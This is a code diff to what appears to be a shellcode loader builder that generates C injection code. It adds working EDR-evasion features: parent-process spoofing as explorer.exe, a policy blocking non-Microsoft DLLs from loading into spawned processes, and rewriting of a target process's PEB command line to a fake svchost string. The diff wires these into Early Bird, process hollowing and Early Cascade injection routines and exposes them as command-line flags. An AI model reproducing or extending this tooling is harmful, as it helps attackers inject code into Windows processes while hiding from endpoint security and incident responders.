@@ -381,6 +381,11 @@ class CodeGenerator:
 #define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
 #define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
 #define DEBUG_BUILD         {1 if self.config.debug else 0}
+#define ENABLE_CMDLINE_SPOOF {1 if self.config.spoof_cmdline else 0}
+#define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
+#define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
+#define PPID_SPOOF_TARGET   L"{self.config.ppid_spoof or 'explorer.exe'}"
+#define ENABLE_BLOCK_DLLS   {1 if self.config.block_dlls else 0}
 
 // ============================================================================
 // Output Macros
@@ -1822,6 +1827,8 @@ BOOL InjectCallback(PINJECTION_CONTEXT pCtx);
 // Helpers
 DWORD FindProcessByName(LPCWSTR wszProcessName);
 BOOL ExecuteViaCallback(PVOID pShellcode);
+BOOL SpoofRemoteCommandLine(HANDLE hProcess);
+HANDLE GetSpoofParentHandle(LPCWSTR wszParentName);
 
 // Thread freeze helpers
 BOOL FreezeRemoteThreads(HANDLE hProcess, DWORD dwMainThreadId);
@@ -1848,6 +1855,11 @@ BOOL ThawRemoteThreads(HANDLE hProcess, DWORD dwMainThreadId);
 
 // Forward declaration for indirect syscalls
 extern "C" void PrepareNextSyscall(DWORD dwIndex);
+
+// Named constant for block-non-Microsoft-DLLs mitigation policy
+#ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000ULL
+#endif
 
 // ============================================================================
 // Helper: Find Process by Name
@@ -1972,10 +1984,55 @@ BOOL InjectEarlyBird(PINJECTION_CONTEXT pCtx) {
     LOG_INFO("Early Bird: Target path: %ws", wszPath);
 #endif
     
+    PROCESS_INFORMATION pi = { 0 };
+#if ENABLE_PPID_SPOOF || ENABLE_BLOCK_DLLS
+    STARTUPINFOEXW siex = { 0 };
+    siex.StartupInfo.cb = sizeof(siex);
+    DWORD dwAttrCount = 0;
+#if ENABLE_PPID_SPOOF
+    HANDLE hSpoofParent = NULL;
+    dwAttrCount++;
+#endif
+#if ENABLE_BLOCK_DLLS
+    DWORD64 dwBlockDllsPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+    dwAttrCount++;
+#endif
+    SIZE_T cbAttrList = 0;
+    InitializeProcThreadAttributeList(NULL, dwAttrCount, 0, &cbAttrList);
+    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttrList);
+    if (!pAttrList) return FALSE;
+    InitializeProcThreadAttributeList(pAttrList, dwAttrCount, 0, &cbAttrList);
+#if ENABLE_PPID_SPOOF
+    hSpoofParent = GetSpoofParentHandle(PPID_SPOOF_TARGET);
+    if (hSpoofParent) {
+        UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hSpoofParent, sizeof(HANDLE), NULL, NULL);
+    }
+#endif
+#if ENABLE_BLOCK_DLLS
+    UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwBlockDllsPolicy, sizeof(DWORD64), NULL, NULL);
+#endif
+    siex.lpAttributeList = pAttrList;
+    if (!CreateProcessW(wszPath, NULL, NULL, NULL, FALSE,
+                       CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
+                       NULL, NULL, (LPSTARTUPINFOW)&siex, &pi)) {
+        DeleteProcThreadAttributeList(pAttrList);
+        HeapFree(GetProcessHeap(), 0, pAttrList);
+#if ENABLE_PPID_SPOOF
+        if (hSpoofParent) CloseHandle(hSpoofParent);
+#endif
+#if DEBUG_BUILD
+        LOG_ERROR("CreateProcessW failed: %lu", GetLastError());
+#endif
+        return FALSE;
+    }
+    DeleteProcThreadAttributeList(pAttrList);
+    HeapFree(GetProcessHeap(), 0, pAttrList);
+#if ENABLE_PPID_SPOOF
+    if (hSpoofParent) CloseHandle(hSpoofParent);
+#endif
+#else
     STARTUPINFOW si = { 0 };
     si.cb = sizeof(si);
-    PROCESS_INFORMATION pi = { 0 };
-    
     if (!CreateProcessW(wszPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
@@ -1984,6 +2041,7 @@ BOOL InjectEarlyBird(PINJECTION_CONTEXT pCtx) {
 #endif
         return FALSE;
     }
+#endif
     
 #if DEBUG_BUILD
     LOG_INFO("Early Bird: PID=%lu, TID=%lu", pi.dwProcessId, pi.dwThreadId);
@@ -2050,6 +2108,10 @@ BOOL InjectEarlyBird(PINJECTION_CONTEXT pCtx) {
     
 #if DEBUG_BUILD
     LOG_INFO("Early Bird: APC queued, resuming...");
+#endif
+    
+#if ENABLE_CMDLINE_SPOOF
+    SpoofRemoteCommandLine(pi.hProcess);
 #endif
     
     PrepareNextSyscall(IDX_NtResumeThread);
@@ -2205,10 +2267,55 @@ BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx) {
     lstrcatW(wszPath, L"\\");
     lstrcatW(wszPath, pCtx->wszTargetProcess);
     
+    PROCESS_INFORMATION pi = { 0 };
+#if ENABLE_PPID_SPOOF || ENABLE_BLOCK_DLLS
+    STARTUPINFOEXW siex = { 0 };
+    siex.StartupInfo.cb = sizeof(siex);
+    DWORD dwAttrCount = 0;
+#if ENABLE_PPID_SPOOF
+    HANDLE hSpoofParent = NULL;
+    dwAttrCount++;
+#endif
+#if ENABLE_BLOCK_DLLS
+    DWORD64 dwBlockDllsPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+    dwAttrCount++;
+#endif
+    SIZE_T cbAttrList = 0;
+    InitializeProcThreadAttributeList(NULL, dwAttrCount, 0, &cbAttrList);
+    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttrList);
+    if (!pAttrList) return FALSE;
+    InitializeProcThreadAttributeList(pAttrList, dwAttrCount, 0, &cbAttrList);
+#if ENABLE_PPID_SPOOF
+    hSpoofParent = GetSpoofParentHandle(PPID_SPOOF_TARGET);
+    if (hSpoofParent) {
+        UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hSpoofParent, sizeof(HANDLE), NULL, NULL);
+    }
+#endif
+#if ENABLE_BLOCK_DLLS
+    UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwBlockDllsPolicy, sizeof(DWORD64), NULL, NULL);
+#endif
+    siex.lpAttributeList = pAttrList;
+    if (!CreateProcessW(wszPath, NULL, NULL, NULL, FALSE,
+                       CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
+                       NULL, NULL, (LPSTARTUPINFOW)&siex, &pi)) {
+        DeleteProcThreadAttributeList(pAttrList);
+        HeapFree(GetProcessHeap(), 0, pAttrList);
+#if ENABLE_PPID_SPOOF
+        if (hSpoofParent) CloseHandle(hSpoofParent);
+#endif
+#if DEBUG_BUILD
+        LOG_ERROR("CreateProcessW failed: %lu", GetLastError());
+#endif
+        return FALSE;
+    }
+    DeleteProcThreadAttributeList(pAttrList);
+    HeapFree(GetProcessHeap(), 0, pAttrList);
+#if ENABLE_PPID_SPOOF
+    if (hSpoofParent) CloseHandle(hSpoofParent);
+#endif
+#else
     STARTUPINFOW si = { 0 };
     si.cb = sizeof(si);
-    PROCESS_INFORMATION pi = { 0 };
-    
     if (!CreateProcessW(wszPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
 #if DEBUG_BUILD
@@ -2216,6 +2323,7 @@ BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx) {
 #endif
         return FALSE;
     }
+#endif
     
     CONTEXT ctx = { 0 };
     ctx.ContextFlags = CONTEXT_FULL;
@@ -2283,6 +2391,9 @@ BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx) {
         return FALSE;
     }
     
+#if ENABLE_CMDLINE_SPOOF
+    SpoofRemoteCommandLine(pi.hProcess);
+#endif
     PrepareNextSyscall(IDX_NtResumeThread);
     ULONG suspendCount = 0;
     NtResumeThread(pi.hThread, &suspendCount);
@@ -2499,6 +2610,119 @@ BOOL InjectThreadPoolReal(PINJECTION_CONTEXT pCtx) {
 // ============================================================================
 // Thread Freeze / Thaw Helpers
 // ============================================================================
+
+// ============================================================================
+// GetSpoofParentHandle - Find a process by name and open it for PPID spoofing
+// ============================================================================
+
+HANDLE GetSpoofParentHandle(LPCWSTR wszParentName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;
+
+    PROCESSENTRY32W pe32 = { 0 };
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    DWORD dwPid = 0;
+    if (Process32FirstW(hSnapshot, &pe32)) {
+        do {
+            if (_wcsicmp(pe32.szExeFile, wszParentName) == 0) {
+                dwPid = pe32.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(hSnapshot, &pe32));
+    }
+    CloseHandle(hSnapshot);
+
+    if (!dwPid) return NULL;
+    return OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwPid);
+}
+
+// ============================================================================
+// SpoofRemoteCommandLine - Overwrite CommandLine in remote PEB
+// NOTE: Offsets are x64-specific (PEB+0x20 for ProcessParameters,
+//       RTL_USER_PROCESS_PARAMETERS+0x70/0x72/0x78 for CommandLine UNICODE_STRING)
+// ============================================================================
+
+typedef NTSTATUS (NTAPI *fn_NtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
+
+BOOL SpoofRemoteCommandLine(HANDLE hProcess) {
+    // Get PEB base address via NtQueryInformationProcess
+    typedef struct _PROCESS_BASIC_INFORMATION_SPOOF {
+        PVOID     Reserved1;
+        PVOID     PebBaseAddress;
+        PVOID     Reserved2[2];
+        ULONG_PTR UniqueProcessId;
+        PVOID     Reserved3;
+    } PROCESS_BASIC_INFORMATION_SPOOF;
+
+    fn_NtQueryInformationProcess _NtQueryInformationProcess =
+        (fn_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+    if (!_NtQueryInformationProcess) return FALSE;
+
+    PROCESS_BASIC_INFORMATION_SPOOF pbi = { 0 };
+    ULONG returnLen = 0;
+    NTSTATUS status = _NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLen);
+    if (!NT_SUCCESS(status) || !pbi.PebBaseAddress) return FALSE;
+
+    // Read PEB.ProcessParameters pointer (offset 0x20 on x64)
+    PVOID pProcParams = NULL;
+    SIZE_T bytesRead = 0;
+    PrepareNextSyscall(IDX_NtReadVirtualMemory);
+    status = NtReadVirtualMemory(hProcess,
+        (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x20),
+        &pProcParams, sizeof(pProcParams), &bytesRead);
+    if (!NT_SUCCESS(status) || !pProcParams) return FALSE;
+
+    // Read CommandLine UNICODE_STRING (Length at +0x70, MaximumLength at +0x72, Buffer at +0x78)
+    USHORT origLength = 0, origMaxLength = 0;
+    PVOID  origBuffer = NULL;
+    PrepareNextSyscall(IDX_NtReadVirtualMemory);
+    NtReadVirtualMemory(hProcess, (PVOID)((ULONG_PTR)pProcParams + 0x70),
+        &origLength, sizeof(USHORT), &bytesRead);
+    PrepareNextSyscall(IDX_NtReadVirtualMemory);
+    NtReadVirtualMemory(hProcess, (PVOID)((ULONG_PTR)pProcParams + 0x72),
+        &origMaxLength, sizeof(USHORT), &bytesRead);
+    PrepareNextSyscall(IDX_NtReadVirtualMemory);
+    NtReadVirtualMemory(hProcess, (PVOID)((ULONG_PTR)pProcParams + 0x78),
+        &origBuffer, sizeof(PVOID), &bytesRead);
+    if (!origBuffer) return FALSE;
+
+    // Spoofed command line (configurable build-time constant)
+    static const WCHAR wszSpoofed[] = SPOOF_CMDLINE_STRING;
+    SIZE_T cbSpoofed = (wcslen(wszSpoofed) + 1) * sizeof(WCHAR);
+
+    // Allocate memory in remote process for the spoofed string
+    PVOID pRemoteBuf = NULL;
+    SIZE_T allocSize = cbSpoofed;
+    PrepareNextSyscall(IDX_NtAllocateVirtualMemory);
+    status = NtAllocateVirtualMemory(hProcess, &pRemoteBuf, 0, &allocSize,
+                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!NT_SUCCESS(status) || !pRemoteBuf) return FALSE;
+
+    // Write the spoofed string to remote process
+    SIZE_T bytesWritten = 0;
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
+    NtWriteVirtualMemory(hProcess, pRemoteBuf, (PVOID)wszSpoofed, cbSpoofed, &bytesWritten);
+
+    // Overwrite CommandLine.Length, MaximumLength, and Buffer in remote RTL_USER_PROCESS_PARAMETERS
+    USHORT newLength    = (USHORT)(wcslen(wszSpoofed) * sizeof(WCHAR));
+    USHORT newMaxLength = (USHORT)cbSpoofed;
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
+    NtWriteVirtualMemory(hProcess, (PVOID)((ULONG_PTR)pProcParams + 0x70),
+        &newLength, sizeof(USHORT), &bytesWritten);
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
+    NtWriteVirtualMemory(hProcess, (PVOID)((ULONG_PTR)pProcParams + 0x72),
+        &newMaxLength, sizeof(USHORT), &bytesWritten);
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
+    NtWriteVirtualMemory(hProcess, (PVOID)((ULONG_PTR)pProcParams + 0x78),
+        &pRemoteBuf, sizeof(PVOID), &bytesWritten);
+
+#if DEBUG_BUILD
+    LOG_SUCCESS("SpoofRemoteCommandLine: Spoofed to %ws", wszSpoofed);
+#endif
+    return TRUE;
+}
+
 
 // Suspends all threads in hProcess except dwMainThreadId (pass 0 to suspend all).
 // Uses a fresh snapshot; threads that terminate between snapshot and OpenThread
@@ -3021,8 +3245,54 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
                  wszSystem32, pCtx->wszTargetProcess);
 
     // Create suspended target process
-    STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
+#if ENABLE_PPID_SPOOF || ENABLE_BLOCK_DLLS
+    STARTUPINFOEXW siex = { 0 };
+    siex.StartupInfo.cb = sizeof(siex);
+    DWORD dwAttrCount = 0;
+#if ENABLE_PPID_SPOOF
+    HANDLE hSpoofParent = NULL;
+    dwAttrCount++;
+#endif
+#if ENABLE_BLOCK_DLLS
+    DWORD64 dwBlockDllsPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+    dwAttrCount++;
+#endif
+    SIZE_T cbAttrList = 0;
+    InitializeProcThreadAttributeList(NULL, dwAttrCount, 0, &cbAttrList);
+    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttrList);
+    if (!pAttrList) return FALSE;
+    InitializeProcThreadAttributeList(pAttrList, dwAttrCount, 0, &cbAttrList);
+#if ENABLE_PPID_SPOOF
+    hSpoofParent = GetSpoofParentHandle(PPID_SPOOF_TARGET);
+    if (hSpoofParent) {
+        UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hSpoofParent, sizeof(HANDLE), NULL, NULL);
+    }
+#endif
+#if ENABLE_BLOCK_DLLS
+    UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwBlockDllsPolicy, sizeof(DWORD64), NULL, NULL);
+#endif
+    siex.lpAttributeList = pAttrList;
+    if (!CreateProcessW(wszTarget, NULL, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
+                        NULL, NULL, (LPSTARTUPINFOW)&siex, &pi)) {
+        DeleteProcThreadAttributeList(pAttrList);
+        HeapFree(GetProcessHeap(), 0, pAttrList);
+#if ENABLE_PPID_SPOOF
+        if (hSpoofParent) CloseHandle(hSpoofParent);
+#endif
+#if DEBUG_BUILD
+        printf("[!] EarlyCascade: CreateProcessW failed: %lu\n", GetLastError());
+#endif
+        return FALSE;
+    }
+    DeleteProcThreadAttributeList(pAttrList);
+    HeapFree(GetProcessHeap(), 0, pAttrList);
+#if ENABLE_PPID_SPOOF
+    if (hSpoofParent) CloseHandle(hSpoofParent);
+#endif
+#else
+    STARTUPINFOW si = { sizeof(si) };
     if (!CreateProcessW(wszTarget, NULL, NULL, NULL, FALSE,
                         CREATE_SUSPENDED | CREATE_NO_WINDOW,
                         NULL, NULL, &si, &pi)) {
@@ -3031,6 +3301,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
 #endif
         return FALSE;
     }
+#endif
 
     HMODULE hNtDLL = GetModuleHandleA("ntdll.dll");
 
@@ -3163,6 +3434,9 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
 
     // Resume thread to trigger cascade callback
     ULONG suspendCount = 0;
+#if ENABLE_CMDLINE_SPOOF
+    SpoofRemoteCommandLine(pi.hProcess);
+#endif
     PrepareNextSyscall(IDX_NtResumeThread);
     NtResumeThread(pi.hThread, &suspendCount);
 
@@ -5164,6 +5438,16 @@ Injection Methods:
     evasion_group.add_argument('--freeze', action='store_true', default=False,
                                help='Freeze all remote threads before shellcode write (default: off)')
     
+    evasion_group.add_argument('--spoof-cmdline', action='store_true', default=False,
+                               help='Spoof remote process command line in PEB (default: disabled)')
+    
+    evasion_group.add_argument('--ppid-spoof', default='',
+                               metavar='PROCESS',
+                               help='Spoof parent PID by inheriting from named process (e.g. explorer.exe)')
+    
+    evasion_group.add_argument('--block-dlls', action='store_true', default=False,
+                               help='Block non-Microsoft DLLs from loading in spawned process (default: disabled)')
+    
     evasion_group.add_argument('--sleep', type=int, default=0,
                                help='Initial sleep in seconds (default: 0)')
     
@@ -5223,6 +5507,9 @@ def args_to_config(args: argparse.Namespace) -> BuildConfig:
     config.edr_preload = args.edr_preload
     config.freeze = args.freeze
     config.disable_preloaded_edr = args.disable_preloaded_edr
+    config.spoof_cmdline = args.spoof_cmdline
+    config.ppid_spoof = args.ppid_spoof
+    config.block_dlls = args.block_dlls
     
     return config
 
@@ -5282,6 +5569,9 @@ def main():
         if hasattr(args, 'no_wipe_pe') and args.no_wipe_pe:   config.wipe_pe          = False
         if args.spoof_stack:                      config.callstack_spoof  = True
         if args.dynapi:                           config.dynapi           = True
+        if args.spoof_cmdline:                    config.spoof_cmdline    = True
+        if args.ppid_spoof:                       config.ppid_spoof       = args.ppid_spoof
+        if args.block_dlls:                       config.block_dlls       = True
     else:
         config = args_to_config(args)
 
